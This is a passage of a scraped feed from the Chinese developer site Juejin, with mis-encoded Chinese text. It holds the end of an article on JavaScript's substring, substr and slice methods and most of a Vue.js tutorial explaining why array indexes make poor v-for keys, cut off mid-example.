<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(-<span class="hljs-number">3</span>));        <span class="hljs-comment">// "ipt" (æœ€å3ä¸ªå­—ç¬¦)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(-<span class="hljs-number">3</span>));         <span class="hljs-comment">// "ipt" (æœ€å3ä¸ªå­—ç¬¦)</span>

<span class="hljs-comment">// å‚æ•°äº¤æ¢</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">7</span>, <span class="hljs-number">4</span>));   <span class="hljs-comment">// "Scr" (è‡ªåŠ¨äº¤æ¢ä¸º4,7)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(<span class="hljs-number">7</span>, <span class="hljs-number">4</span>));      <span class="hljs-comment">// "ipt" (ä»ç´¢å¼•7å–4ä¸ªï¼Œå®é™…åªæœ‰3ä¸ª)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">7</span>, <span class="hljs-number">4</span>));       <span class="hljs-comment">// "" (start&gt;endï¼Œè¿”å›ç©º)</span>
</code></pre>
<h2 data-id="heading-6">æœ€ä½³å®è·µå»ºè®®</h2>
<ol>
<li><strong>ä¸å†ä½¿ç”¨Â <code>substr()</code></strong> ï¼Œå› ä¸ºå®ƒæ˜¯å·²åºŸå¼ƒçš„æ—§æ–¹æ³•</li>
<li><strong>æ ¹æ®éœ€æ±‚é€‰æ‹©</strong>ï¼š
<ul>
<li>ä½¿ç”¨Â <code>substring()</code>ï¼šå½“éœ€è¦æ˜ç¡®çš„å¼€å§‹å’Œç»“æŸç´¢å¼•æ—¶</li>
<li>ä½¿ç”¨Â <code>slice()</code>ï¼šå½“éœ€è¦è´Ÿæ•°ç´¢å¼•åŠŸèƒ½æ—¶ï¼Œæˆ–ä½œä¸ºÂ <code>substr()</code>Â çš„æ›¿ä»£</li>
</ul>
</li>
<li><strong>è®°å¿†æŠ€å·§</strong>ï¼š
<ul>
<li><code>substring</code>ï¼šç¬¬äºŒä¸ªå‚æ•°æ˜¯"åˆ°å“ªé‡Œç»“æŸ"</li>
<li><code>substr</code>ï¼šç¬¬äºŒä¸ªå‚æ•°æ˜¯"è¦æˆªå–å¤šé•¿"ï¼ˆå·²åºŸå¼ƒï¼‰</li>
<li><code>slice</code>ï¼šç±»ä¼¼äºæ•°ç»„çš„Â <code>slice</code>Â æ–¹æ³•ï¼Œæ”¯æŒè´Ÿæ•°ç´¢å¼•</li>
</ul>
</li>
</ol>
<p>ç®€å•æ¥è¯´ï¼š<strong>è¯·ä½¿ç”¨Â <code>slice()</code>Â æˆ–Â <code>substring()</code>ï¼Œé¿å…ä½¿ç”¨Â <code>substr()</code>ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆ Vue æ¸²æŸ“åˆ—è¡¨æ—¶ï¼Œä¸èƒ½éšä¾¿ç”¨æ•°ç»„ä¸‹æ ‡å½“ keyï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592501225003909171</link>    <guid>https://juejin.cn/post/7592501225003909171</guid>    <pubDate>2026-01-07T14:57:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592501225003909171" data-draft-id="7592444642278277130" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆ Vue æ¸²æŸ“åˆ—è¡¨æ—¶ï¼Œä¸èƒ½éšä¾¿ç”¨æ•°ç»„ä¸‹æ ‡å½“ keyï¼Ÿ"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-07T14:57:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŒ—è¾°alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆ Vue æ¸²æŸ“åˆ—è¡¨æ—¶ï¼Œä¸èƒ½éšä¾¿ç”¨æ•°ç»„ä¸‹æ ‡å½“ keyï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŒ—è¾°alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T14:57:34.000Z" title="Wed Jan 07 2026 14:57:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>çœ‹ä¼¼ç®€å•çš„åˆ—è¡¨æ¸²æŸ“ï¼ŒèƒŒåéšè—ç€ Vue çš„æ¸²æŸ“ä¼˜åŒ–ç„æœºã€‚</p>
</blockquote>
<p>åœ¨ Vue é¡¹ç›®å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦æ¸²æŸ“åˆ—è¡¨æ•°æ®ã€‚å¾ˆå¤šäººä¸ºäº†æ–¹ä¾¿ï¼Œéšæ‰‹å°±ç”¨æ•°ç»„ç´¢å¼•ä½œä¸º key å€¼ï¼Œä½†è¿™ç§åšæ³•å¯èƒ½ä¼šå¸¦æ¥æ„æƒ³ä¸åˆ°çš„é—®é¢˜ã€‚ä»Šå¤©å°±æ¥æ·±å…¥æ¢è®¨ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆ Vue å®˜æ–¹ä¸æ¨èè¿™æ ·åšã€‚</p>
<h2 data-id="heading-0">ä¸€ã€åˆè¯† Vue åˆ—è¡¨æ¸²æŸ“ä¸ key çš„ä½œç”¨</h2>
<h3 data-id="heading-1">1.1 Vue åˆ—è¡¨æ¸²æŸ“åŸºç¡€</h3>
<p>åœ¨ Vue ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨Â <code>v-for</code>Â æŒ‡ä»¤æ¥æ¸²æŸ“åˆ—è¡¨ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">li</span>Â <span class="hljs-attr">v-for</span>=<span class="hljs-string">"itemÂ inÂ items"</span>Â <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.id"</span>&gt;</span>
Â Â Â Â Â Â Â Â {{Â item.nameÂ }}
Â Â Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span>Â <span class="hljs-keyword">default</span>Â {
Â Â <span class="hljs-title function_">data</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â {
Â Â Â Â Â Â <span class="hljs-attr">items</span>:Â [
Â Â Â Â Â Â Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">1</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'è‹¹æœ'</span>Â },
Â Â Â Â Â Â Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">2</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'é¦™è•‰'</span>Â },
Â Â Â Â Â Â Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">3</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'æ©™å­'</span>Â }
Â Â Â Â Â Â ]
Â Â Â Â }
Â Â }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-2">1.2 key çš„ç¥ç§˜ä½œç”¨</h3>
<p>key çš„ä¸»è¦ä½œç”¨æ˜¯å¸®åŠ© VueÂ <strong>è¯†åˆ«èŠ‚ç‚¹çš„èº«ä»½</strong>ï¼Œä»è€Œå®ç°é«˜æ•ˆçš„ DOM æ›´æ–°ã€‚Vue é€šè¿‡ key æ¥åˆ¤æ–­å“ªäº›å…ƒç´ æ˜¯æ–°çš„ã€å“ªäº›æ˜¯æ—§çš„ï¼Œä»¥åŠå…ƒç´ æ˜¯å¦è¢«ç§»åŠ¨è¿‡ã€‚</p>
<p>æ²¡æœ‰ key æ—¶ï¼ŒVue ä¼šé‡‡ç”¨ "å°±åœ°å¤ç”¨" ç­–ç•¥ï¼Œè¿™å¯èƒ½å¯¼è‡´ï¼š</p>
<ul>
<li>â€¢ ä¸å¿…è¦çš„ DOM æ“ä½œ</li>
<li>â€¢ çŠ¶æ€æ··ä¹±ï¼ˆå¦‚è¡¨å•è¾“å…¥å€¼é”™ä¹±ï¼‰</li>
<li>â€¢ æ€§èƒ½ä¸‹é™</li>
</ul>
<h2 data-id="heading-3">äºŒã€ä¸‹æ ‡ä½œä¸º key çš„é—®é¢˜å‰–æ</h2>
<h3 data-id="heading-4">2.1 é—®é¢˜åœºæ™¯å†ç°</h3>
<p>å…ˆçœ‹ä¸€ä¸ªå¸¸è§çš„é”™è¯¯ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span>Â @<span class="hljs-attr">click</span>=<span class="hljs-string">"removeFirstItem"</span>&gt;</span>åˆ é™¤ç¬¬ä¸€é¡¹<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-comment">&lt;!--Â é”™è¯¯ç¤ºèŒƒï¼šä½¿ç”¨ä¸‹æ ‡ä½œä¸ºÂ keyÂ --&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">li</span>Â <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item,Â index)Â inÂ items"</span>Â <span class="hljs-attr">:key</span>=<span class="hljs-string">"index"</span>&gt;</span>
Â Â Â Â Â Â Â Â {{Â item.nameÂ }}Â 
Â Â Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">input</span>Â <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span>Â <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"è¯·è¾“å…¥å¤‡æ³¨"</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span>Â <span class="hljs-keyword">default</span>Â {
Â Â <span class="hljs-title function_">data</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â {
Â Â Â Â Â Â <span class="hljs-attr">items</span>:Â [
Â Â Â Â Â Â Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">1</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'è‹¹æœ'</span>Â },
Â Â Â Â Â Â Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">2</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'é¦™è•‰'</span>Â },
Â Â Â Â Â Â Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">3</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'æ©™å­'</span>Â }
Â Â Â Â Â Â ]
Â Â Â Â }
Â Â },
Â Â <span class="hljs-attr">methods</span>:Â {
Â Â Â Â <span class="hljs-title function_">removeFirstItem</span>(<span class="hljs-params"/>)Â {
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">shift</span>()Â <span class="hljs-comment">//Â åˆ é™¤ç¬¬ä¸€ä¸ªå…ƒç´ </span>
Â Â Â Â }
Â Â }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-5">2.2 åˆ é™¤æ“ä½œçš„é—®é¢˜æ¼”ç¤º</h3>
<p>å‡è®¾æˆ‘ä»¬åœ¨ä¸‰ä¸ªè¾“å…¥æ¡†ä¸­åˆ†åˆ«è¾“å…¥ï¼š</p>
<ul>
<li>â€¢ ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†ï¼š "æˆ‘å–œæ¬¢è‹¹æœ"</li>
<li>â€¢ ç¬¬äºŒä¸ªè¾“å…¥æ¡†ï¼š "é¦™è•‰å¾ˆç”œ"</li>
<li>â€¢ ç¬¬ä¸‰ä¸ªè¾“å…¥æ¡†ï¼š "æ©™å­å¯Œå«VC"</li>
</ul>
<p>å½“æˆ‘ä»¬ç‚¹å‡»"åˆ é™¤ç¬¬ä¸€é¡¹"æŒ‰é’®åï¼Œä½ æœŸæœ›çœ‹åˆ°çš„æ˜¯ï¼š</p>
<ul>
<li>â€¢ åˆ é™¤"è‹¹æœ"è¿™ä¸€è¡Œï¼Œè¾“å…¥æ¡†å†…å®¹"æˆ‘å–œæ¬¢è‹¹æœ"æ¶ˆå¤±</li>
<li>â€¢ "é¦™è•‰"å’Œ"æ©™å­"ä¿æŒä¸å˜</li>
</ul>
<p>ä½†å®é™…ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p>
<h2 data-id="heading-6">ä¸‰ã€Vue çš„ Diff ç®—æ³•ä¸ key çš„å…³ç³»</h2>
<h3 data-id="heading-7">3.1 Vue çš„è™šæ‹Ÿ DOM Diff ç®—æ³•</h3>
<p>ä¸ºäº†ç†è§£ key çš„é‡è¦æ€§ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£ Vue çš„æ›´æ–°æœºåˆ¶ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">æ•°æ®å˜åŒ–é‡æ–°æ¸²æŸ“è™šæ‹ŸDOMæ–°æ—§è™šæ‹ŸDOMå¯¹æ¯” Diffç®—æ³•æ ¹æ®<span class="hljs-keyword">key</span>è¯†åˆ«èŠ‚ç‚¹èŠ‚ç‚¹å¯å¤ç”¨èŠ‚ç‚¹éœ€æ›´æ–°èŠ‚ç‚¹éœ€ç§»åŠ¨æœ€å°åŒ–DOMæ“ä½œ
</code></pre>
<h3 data-id="heading-8">3.2 ä¸‹æ ‡ä½œä¸º key æ—¶çš„ Diff è¿‡ç¨‹</h3>
<p>å½“ä½¿ç”¨ä¸‹æ ‡ä½œä¸º key æ—¶ï¼Œåˆ é™¤ç¬¬ä¸€ä¸ªå…ƒç´ åçš„å¯¹æ¯”è¿‡ç¨‹ï¼š</p>
<p><strong>åˆ é™¤å‰ï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">ç´¢å¼•:Â 0Â Â Â Â 1Â Â Â Â 2</span>
<span class="hljs-section">key:Â Â 0Â Â Â Â 1Â Â Â Â 2</span>
<span class="hljs-section">å€¼:Â Â Â è‹¹æœÂ é¦™è•‰Â æ©™å­</span>
<span class="hljs-section">è¾“å…¥:Â æˆ‘å–œæ¬¢è‹¹æœÂ é¦™è•‰å¾ˆç”œÂ æ©™å­å¯Œå«VC</span>
</code></pre>
<p><strong>åˆ é™¤åï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">ç´¢å¼•:Â 0Â Â Â Â 1</span>
<span class="hljs-section">key:Â Â 0Â Â Â Â 1</span>
<span class="hljs-section">å€¼:Â Â Â é¦™è•‰Â æ©™å­</span>
<span class="hljs-section">è¾“å…¥:Â ???Â ???</span>
</code></pre>
<p>Vue çš„ Diff ç®—æ³•ä¼šè¿™æ ·æ¯”è¾ƒï¼š</p>
<ol>
<li>
<ol>
<li>key=0 çš„å…ƒç´ ï¼šæ—§å€¼æ˜¯"è‹¹æœ"ï¼Œæ–°å€¼æ˜¯"é¦™è•‰" â†’Â <strong>æ›´æ–°å†…å®¹</strong></li>
</ol>
</li>
<li>
<ol start="2">
<li>key=1 çš„å…ƒç´ ï¼šæ—§å€¼æ˜¯"é¦™è•‰"ï¼Œæ–°å€¼æ˜¯"æ©™å­" â†’Â <strong>æ›´æ–°å†…å®¹</strong></li>
</ol>
</li>
<li>
<ol start="3">
<li>key=2 çš„å…ƒç´ ï¼šæ–°è™šæ‹ŸDOMä¸­ä¸å­˜åœ¨ â†’Â <strong>åˆ é™¤</strong></li>
</ol>
</li>
</ol>
<p>ç»“æœæ˜¯ï¼š</p>
<ul>
<li>â€¢ åŸæœ¬ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†çš„"æˆ‘å–œæ¬¢è‹¹æœ"ä¼šå‡ºç°åœ¨æ–°çš„ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†ï¼ˆæ˜¾ç¤º"é¦™è•‰"ï¼‰</li>
<li>â€¢ åŸæœ¬ç¬¬äºŒä¸ªè¾“å…¥æ¡†çš„"é¦™è•‰å¾ˆç”œ"ä¼šå‡ºç°åœ¨æ–°çš„ç¬¬äºŒä¸ªè¾“å…¥æ¡†ï¼ˆæ˜¾ç¤º"æ©™å­"ï¼‰</li>
<li>â€¢ ç”¨æˆ·è¾“å…¥å†…å®¹å’Œæ˜¾ç¤ºçš„æ•°æ®å®Œå…¨é”™ä½ï¼</li>
</ul>
<h3 data-id="heading-9">3.3 æ­£ç¡®ä½¿ç”¨ key çš„ Diff è¿‡ç¨‹</h3>
<p>ä½¿ç”¨å”¯ä¸€ id ä½œä¸º keyï¼š</p>
<pre><code class="hljs language-ini" lang="ini">&lt;liÂ <span class="hljs-attr">v-for</span>=<span class="hljs-string">"itemÂ inÂ items"</span>Â :key=<span class="hljs-string">"item.id"</span>&gt;
</code></pre>
<p><strong>åˆ é™¤å‰ï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">key:Â Â 1Â Â Â Â 2Â Â Â Â 3</span>
<span class="hljs-section">å€¼:Â Â Â è‹¹æœÂ é¦™è•‰Â æ©™å­</span>
<span class="hljs-section">è¾“å…¥:Â æˆ‘å–œæ¬¢è‹¹æœÂ é¦™è•‰å¾ˆç”œÂ æ©™å­å¯Œå«VC</span>
</code></pre>
<p><strong>åˆ é™¤åï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">key:Â Â 2Â Â Â Â 3</span>
<span class="hljs-section">å€¼:Â Â Â é¦™è•‰Â æ©™å­</span>
<span class="hljs-section">è¾“å…¥:Â é¦™è•‰å¾ˆç”œÂ æ©™å­å¯Œå«VC</span>
</code></pre>
<p>Vue çš„ Diff ç®—æ³•ï¼š</p>
<ol>
<li>
<ol>
<li>key=1 çš„å…ƒç´ ï¼šæ–°è™šæ‹ŸDOMä¸­ä¸å­˜åœ¨ â†’Â <strong>åˆ é™¤</strong></li>
</ol>
</li>
<li>
<ol start="2">
<li>key=2 çš„å…ƒç´ ï¼šæ–°æ—§éƒ½å­˜åœ¨ï¼Œå†…å®¹éƒ½æ˜¯"é¦™è•‰" â†’Â <strong>å¤ç”¨èŠ‚ç‚¹</strong></li>
</ol>
</li>
<li>
<ol start="3">
<li>key=3 çš„å…ƒç´ ï¼šæ–°æ—§éƒ½å­˜åœ¨ï¼Œå†…å®¹éƒ½æ˜¯"æ©™å­" â†’Â <strong>å¤ç”¨èŠ‚ç‚¹</strong></li>
</ol>
</li>
</ol>
<p>å®Œç¾åŒ¹é…ï¼ç”¨æˆ·è¾“å…¥çŠ¶æ€å¾—åˆ°ä¿ç•™ã€‚</p>
<h2 data-id="heading-10">å››ã€å„ç§æ“ä½œåœºæ™¯åˆ†æ</h2>
<h3 data-id="heading-11">4.1 æ•°ç»„æ“ä½œçš„å…¨é¢åˆ†æ</h3>
<p>è®©æˆ‘ä»¬é€šè¿‡ä»£ç æ¼”ç¤ºä¸åŒæ“ä½œçš„å½±å“ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//Â æµ‹è¯•å„ç§æ•°ç»„æ“ä½œ</span>
<span class="hljs-attr">methods</span>:Â {
Â Â <span class="hljs-comment">//Â 1.Â å¤´éƒ¨æ·»åŠ å…ƒç´ </span>
Â Â <span class="hljs-title function_">addToHead</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">unshift</span>({Â 
Â Â Â Â Â Â <span class="hljs-attr">id</span>:Â <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),Â 
Â Â Â Â Â Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'æ–°æ°´æœ'</span>Â 
Â Â Â Â })
Â Â },
Â Â 
Â Â <span class="hljs-comment">//Â 2.Â ä¸­é—´æ’å…¥å…ƒç´ </span>
Â Â <span class="hljs-title function_">insertMiddle</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">splice</span>(<span class="hljs-number">1</span>,Â <span class="hljs-number">0</span>,Â {
Â Â Â Â Â Â <span class="hljs-attr">id</span>:Â <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
Â Â Â Â Â Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'æ’å…¥çš„æ°´æœ'</span>
Â Â Â Â })
Â Â },
Â Â 
Â Â <span class="hljs-comment">//Â 3.Â æ’åºæ“ä½œ</span>
Â Â <span class="hljs-title function_">sortItems</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a,Â b</span>)Â =&gt;</span>Â a.<span class="hljs-property">name</span>.<span class="hljs-title function_">localeCompare</span>(b.<span class="hljs-property">name</span>))
Â Â },
Â Â 
Â Â <span class="hljs-comment">//Â 4.Â è¿‡æ»¤æ“ä½œ</span>
Â Â <span class="hljs-title function_">filterItems</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>Â =Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span>Â =&gt;</span>Â 
Â Â Â Â Â Â item.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'æœ'</span>)
Â Â Â Â )
Â Â },
Â Â 
Â Â <span class="hljs-comment">//Â 5.Â äº¤æ¢ä½ç½®</span>
Â Â <span class="hljs-title function_">swapItems</span>(<span class="hljs-params"/>)Â {
